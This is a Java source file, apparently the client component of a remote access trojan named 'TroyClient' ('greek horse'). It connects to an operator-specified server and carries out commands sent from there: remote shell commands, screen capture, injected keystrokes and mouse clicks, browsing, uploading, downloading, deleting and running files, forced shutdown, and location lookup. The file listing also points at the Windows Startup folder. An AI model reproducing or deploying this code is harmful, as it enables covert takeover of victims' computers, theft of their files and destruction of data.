package greek.horse.client;

import greek.horse.client.tasks.ClientChatTask;
import greek.horse.client.tasks.DesktopTask;
import greek.horse.models.*;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.lang3.SystemUtils;
import org.apache.log4j.Logger;

import javax.json.Json;
import javax.json.JsonObject;
import javax.json.JsonReader;
import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;

public class ClientSocketManager {

    private static final String id = ThreadLocalRandom.current().nextInt(100, 9999 + 1) + System.currentTimeMillis() + SystemUtils.getHostName();

    private AtomicBoolean running = new AtomicBoolean(true);
    private final TroyClient troyClient;
    private final Robot bot = new Robot();
    public final static HashMap<Integer, Integer> extendedKeys = createMap();

    private final AtomicReference<ObjectOutputStream> oos = new AtomicReference<>();
    private Socket socket;
    private final ExecutorService threadPool = Executors.newCachedThreadPool();

    private final LockTask lockTask = new LockTask(this, bot);
    private final ClientTerminalTask terminalTask = new ClientTerminalTask(this);
    private final DesktopTask desktopTask = new DesktopTask(this, bot);
    private final ClientChatTask chatTask = new ClientChatTask(this);

    private final HashMap<FunctionTicket, Object> fixedMap = new HashMap<>();

    private static final Logger log = Logger.getLogger(ClientSocketManager.class);


    public ClientSocketManager(TroyClient troyClient) throws AWTException {
        this.troyClient = troyClient;
        threadPool.execute(lockTask);
        threadPool.execute(terminalTask);
        threadPool.execute(desktopTask);
        threadPool.execute(chatTask);
    }

    private static HashMap<Integer, Integer> createMap() {
        HashMap<Integer, Integer> extendedKeys = new HashMap<>();
        extendedKeys.put(16, KeyEvent.VK_SHIFT);
        extendedKeys.put(20, KeyEvent.VK_CAPS_LOCK);
        extendedKeys.put(9, KeyEvent.VK_TAB);
        extendedKeys.put(17, KeyEvent.VK_CONTROL);
        extendedKeys.put(92, KeyEvent.getExtendedKeyCodeForChar('\\'));
        extendedKeys.put(524, KeyEvent.VK_WINDOWS);
        extendedKeys.put(18, KeyEvent.VK_ALT);
        extendedKeys.put(65406, KeyEvent.VK_ALT_GRAPH);
        extendedKeys.put(0, KeyEvent.VK_SLASH);
        extendedKeys.put(154, KeyEvent.VK_PRINTSCREEN);
        extendedKeys.put(145, KeyEvent.VK_SCROLL_LOCK);
        extendedKeys.put(144, KeyEvent.VK_NUM_LOCK);
        extendedKeys.put(96, KeyEvent.VK_0);
        extendedKeys.put(97, KeyEvent.VK_1);
        extendedKeys.put(98, KeyEvent.VK_2);
        extendedKeys.put(99, KeyEvent.VK_3);
        extendedKeys.put(100, KeyEvent.VK_4);
        extendedKeys.put(101, KeyEvent.VK_5);
        extendedKeys.put(102, KeyEvent.VK_6);
        extendedKeys.put(103, KeyEvent.VK_7);
        extendedKeys.put(104, KeyEvent.VK_8);
        extendedKeys.put(105, KeyEvent.VK_9);
        extendedKeys.put(111, KeyEvent.VK_SLASH);
        extendedKeys.put(106, KeyEvent.VK_ASTERISK);
        extendedKeys.put(109, KeyEvent.VK_MINUS);
        extendedKeys.put(107, KeyEvent.VK_PLUS);
        extendedKeys.put(110, KeyEvent.VK_COMMA);
        extendedKeys.put(129, KeyEvent.VK_DEAD_ACUTE);
        extendedKeys.put(131, KeyEvent.VK_DEAD_TILDE);
        extendedKeys.put(222, KeyEvent.VK_QUOTE);
        return extendedKeys;
    }

    public void run(String hostLink, String port) throws IOException, ClassNotFoundException, InterruptedException {
        try {

            socket = connect(hostLink, port);

            ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());

            this.oos.set(new ObjectOutputStream(socket.getOutputStream()));

            this.oos.get().writeObject(id); // register ID

            while (running.get()) {
                HashMap<FunctionTicket, Object> requestMap = (HashMap<FunctionTicket, Object>) ois.readObject();
                log.debug("requestMap: " + requestMap);

                HashMap<FunctionTicket, Object> answerMap = new HashMap<>();

                Set<FunctionTicket> keys = Collections.unmodifiableSet(requestMap.keySet());

                for (FunctionTicket f : keys) {
                    if (f.isFixed()) {
                        fixedMap.put(f, requestMap.get(f));
                    }
                }

                for (FunctionTicket ticket : requestMap.keySet()) {
                    Object obj = answerTicket(ticket, requestMap.get(ticket));
                    if (obj != null) { // no answer filter
                        answerMap.put(ticket, obj);
                    }
                }

                if (answerMap.keySet().size() > 0) {
                    log.debug("answerMap: " + answerMap);
                    this.oos.getAcquire().writeObject(answerMap);
                    this.oos.getAcquire().flush();
                }
            }
            stop();

        } catch (Exception e) {
            this.running = new AtomicBoolean(false);
            throw e;
        }
    }

    private Object answerTicket(FunctionTicket ticket, Object o) {
        try {

            RequestFunction f = ticket.getFunction();

            switch (f) {
                case NET_INFO:
                    return getNetInfo();
                case DESKTOP_START:
                    return startDesktop(o, ticket);
                case DESKTOP_REFRESH:
                    return refreshDesktop(o, ticket);
                case MONITOR_COUNT:
                    return getMonitorCount();
                case DISCONNECT:
                    return doDisconnect();
                case USER_INPUT:
                    return doUserInput(o);
                case FILES:
                    return getFiles(o);
                case LOCK:
                    return toggleLock(o);
                case STOP:
                    return getLock();
                case TERMINAL_START:
                    return startTerminal(ticket);
                case TERMINAL_COMMAND:
                    return sendCommand(o);
                case CHAT_START:
                    return startChat(ticket);
                case CHAT_MESSAGE:
                    return sendMessage(o);
                case TURN_OFF:
                    return turnOff();
                case RELEASE:
                    return doRelease(o);
            }

        } catch (Exception e) {
            e.printStackTrace();
            this.running.set(false);
        }

        return null;
    }

    private Object sendMessage(Object o) {
        chatTask.addMessage((String)o);
        return null;
    }

    private Object startChat(FunctionTicket ticket) {
        chatTask.setTicket(ticket);
        return null;
    }

    private Object getMonitorCount() {
        return GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices().length;
    }

    private Object turnOff() {
        try {
            String shutdownCommand;
            String t = "now";

            if (SystemUtils.IS_OS_AIX)
                shutdownCommand = "shutdown -Fh " + t;
            else if (SystemUtils.IS_OS_FREE_BSD || SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC || SystemUtils.IS_OS_MAC_OSX || SystemUtils.IS_OS_NET_BSD || SystemUtils.IS_OS_OPEN_BSD || SystemUtils.IS_OS_UNIX)
                shutdownCommand = "shutdown -h " + t;
            else if (SystemUtils.IS_OS_HP_UX)
                shutdownCommand = "shutdown -hy " + t;
            else if (SystemUtils.IS_OS_IRIX)
                shutdownCommand = "shutdown -y -g " + t;
            else if (SystemUtils.IS_OS_SOLARIS || SystemUtils.IS_OS_SUN_OS)
                shutdownCommand = "shutdown -y -i5 -g" + t;
            else if (SystemUtils.IS_OS_WINDOWS)
                shutdownCommand = "shutdown.exe /s /t 0";
            else
                return false;

            Runtime.getRuntime().exec(shutdownCommand);
        } catch (Exception e) {
            log.error(e);
        }

        return null;
    }

    private Object sendCommand(Object o) {
        terminalTask.sendCommand((String) o);
        return null;
    }

    private Object startTerminal(FunctionTicket ticket) {
        terminalTask.setTicket(ticket);
        return null;
    }

    private Object doRelease(Object obj) {
        FunctionTicket remove = fixedMap.keySet().parallelStream().filter(f -> f.getId().contentEquals((String) obj)).findFirst().get();
        fixedMap.remove(remove);
        return null;
    }

    private Object getLock() {
        System.exit(0);
        return null;
    }

    private Object toggleLock(Object o) {
        Boolean lock = (Boolean) o;
        lockTask.setRunning(lock);
        return null;
    }

    private Object getFiles(Object o) {
        FileBrowserTicket ticket = (FileBrowserTicket) o;
        try {
            switch (ticket.getTicketType()) {
                case KNOWN_FOLDERS:
                    ArrayList<FileStruct> list = new ArrayList<>();

                    Path userFolder = Path.of(SystemUtils.getUserHome().toURI());
                    list.add(new FileStruct(userFolder.getName(userFolder.getNameCount() - 1).toString(), userFolder.toFile().length(), userFolder.toString(), false, userFolder.toFile().isDirectory()));

                    Path desktop = Path.of(FileSystemView.getFileSystemView().getHomeDirectory().toURI());
                    list.add(new FileStruct(desktop.getName(desktop.getNameCount() - 1).toString(), desktop.toFile().length(), desktop.toString(), false, desktop.toFile().isDirectory()));

                    Path newTemp = Files.createTempDirectory("temp_");
                    Path temp = newTemp.getParent();
                    list.add(new FileStruct(temp.getName(temp.getNameCount() - 1).toString(), temp.toFile().length(), temp.toString(), false, temp.toFile().isDirectory()));
                    list.add(new FileStruct(newTemp.getName(newTemp.getNameCount() - 1).toString(), newTemp.toFile().length(), newTemp.toString(), false, newTemp.toFile().isDirectory()));

                    if (SystemUtils.IS_OS_WINDOWS) {
                        //C:\Users\Murilo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
                        String path = userFolder + File.separator + "AppData" + File.separator + "Roaming"
                                + File.separator + "Microsoft" + File.separator + "Windows"
                                + File.separator + "Start Menu" + File.separator + "Programs"
                                + File.separator + "Startup";
                        Path startup = Path.of(path);
                        list.add(new FileStruct(startup.getName(startup.getNameCount() - 1).toString(), startup.toFile().length(), startup.toString(), false, startup.toFile().isDirectory()));
                    }

                    return new FileBrowserResponseWrapper(list);

                case LOAD_FILES:
                    ArrayList<FileStruct> loadFiles =
                            Files.list(Path.of(ticket.getUri()))
                                    .map(p -> new FileStruct(p.getName(p.getNameCount() - 1).toString(), p.toFile().length(), p.toString(), false, p.toFile().isDirectory()))
                                    .collect(Collectors.toCollection(ArrayList::new));

                    loadFiles = ClientSocketManager.sortForBrowsing(loadFiles);

                    return new FileBrowserResponseWrapper(loadFiles);
                case LOAD_DRIVES:
                    return Arrays.stream(File.listRoots())
                            .map(f -> new FileStruct(f.getPath(), f.getTotalSpace(), Path.of(f.toURI()).toString(), true, false))
                            .sorted().collect(Collectors.toCollection(ArrayList::new));
                case UPLOAD:
                    String path = Path.of(ticket.getUri()).toString() + File.separator + ticket.getFileData().getFileName();
                    Files.write(Path.of(path), ticket.getFileData().getFileBytes());
                    return new FileBrowserResponseWrapper();
                case RUN:
                    Desktop.getDesktop().open(Path.of(ticket.getUri()).toFile());
                    return new FileBrowserResponseWrapper();
                case DELETE:
                    Files.delete(Path.of(ticket.getUri()));
                    return new FileBrowserResponseWrapper();
                case DOWNLOAD:
                    Path p = Path.of(ticket.getUri());
                    FileData data = new FileData(Files.readAllBytes(p), p.getName(p.getNameCount() - 1).toString());
                    return new FileBrowserResponseWrapper(data);
                default:
                    return null;

            }
        } catch (Exception e) {
            log.debug("Error " + ticket.getTicketType() + " : ", e);
            return new FileBrowserResponseWrapper(e);
        }

    }

    private static ArrayList<FileStruct> sortForBrowsing(ArrayList<FileStruct> loadFiles) {
        ArrayList<ArrayList<FileStruct>> orderedList = new ArrayList<>();
        for (FileType t : FileType.values()) {
            ArrayList<FileStruct> collect = (ArrayList<FileStruct>) loadFiles.stream()
                    .sorted()
                    .filter(f -> f.getFileType().equals(t))
                    .collect(Collectors.toList());
            if (!collect.isEmpty()) {
                orderedList.add(collect);
            }
        }
        ArrayList<FileStruct> newList = new ArrayList<>();
        orderedList.forEach(newList::addAll);
        return newList;
    }

    private Object doUserInput(Object o) {
        ArrayList<UserInput> inputs = (ArrayList<UserInput>) o;

        inputs.parallelStream().forEachOrdered(ui -> {

            switch (ui.getMode()) {
                case KEY_PRESSED -> pressKey(ui.getKey());
                case KEY_RELEASED -> releaseKey(ui.getKey());
                case CLICK_PRESSED -> desktopTask.pressClick(ui.getX(), ui.getY(), ui.getCode());
                case CLICK_RELEASED -> desktopTask.releaseClick(ui.getX(), ui.getY(), ui.getCode());
            }

        });

        return null;
    }

    private void pressKey(int key) {
        try {
            bot.keyPress(getKey(key));
        } catch (Exception e) {
            log.error("Key pressing error. Key skipped. ", e);
        }
    }

    private void releaseKey(int key) {
        try {
            bot.keyRelease(getKey(key));
        } catch (Exception e) {
            log.error("Key releasing error. Key skipped. ", e);
        }
    }

    private int getKey(int key) {
        int k;
        if (extendedKeys.containsKey(key)) {
            k = extendedKeys.get(key);
        } else {
            k = KeyEvent.getExtendedKeyCodeForChar(key);
        }
        if (k == KeyEvent.VK_UNDEFINED) {
            throw new IllegalArgumentException("KeyCode " + key + " does not exist.");
        }
        return k;
    }

    private Object doDisconnect() {
        try {
            socket.close();
        } catch (Exception e) {
            log.info("Exception closing socket on disconnect request");
        }
        return null;
    }

    private Object refreshDesktop(Object o, FunctionTicket ticket) {
        desktopTask.setInfo((MonitorDesktopWrapper) o);
        return null;
    }

    private Object startDesktop(Object readObj, FunctionTicket ticket) {
        desktopTask.setInfo((MonitorDesktopWrapper) readObj);
        desktopTask.setTicket(ticket);

        return null;
    }

    private void stop() {
        try {
            if (socket != null) {
                socket.close();
            }
        } catch (Exception e) {
            System.err.println("Error closing client");
        }
    }

    private NetInfo getNetInfo() throws IOException {
        InetAddress inet = InetAddress.getLocalHost();

        Request request = new Request.Builder().url("http://ip-api.com/json").build();
        Response response = troyClient.getHttpClient().newCall(request).execute();

        if (response.code() != 200) {
            throw new IOException("Wrong response code: " + response.code());
        }

        JsonReader reader = Json.createReader(new StringReader(response.body().string()));
        JsonObject json = reader.readObject();

        return new NetInfo(inet, json);

    }

    private Socket connect(String hostLink, String port) throws IOException {
        Socket socket = new Socket(hostLink, Integer.parseInt(port));

        if (!socket.isConnected()) {
            throw new IOException("Socket didn't connected in time");
        }

        log.info("Connection stabilised");
        return socket;
    }

    public void kill() {
        this.running.set(false);
//        this.stop();
    }

    public AtomicBoolean getRunning() {
        return running;
    }

    public AtomicReference<ObjectOutputStream> getOos() {
        return oos;
    }

    public ExecutorService getThreadPool() {
        return threadPool;
    }

    public HashMap<FunctionTicket, Object> getFixedMap() {
        return fixedMap;
    }
}
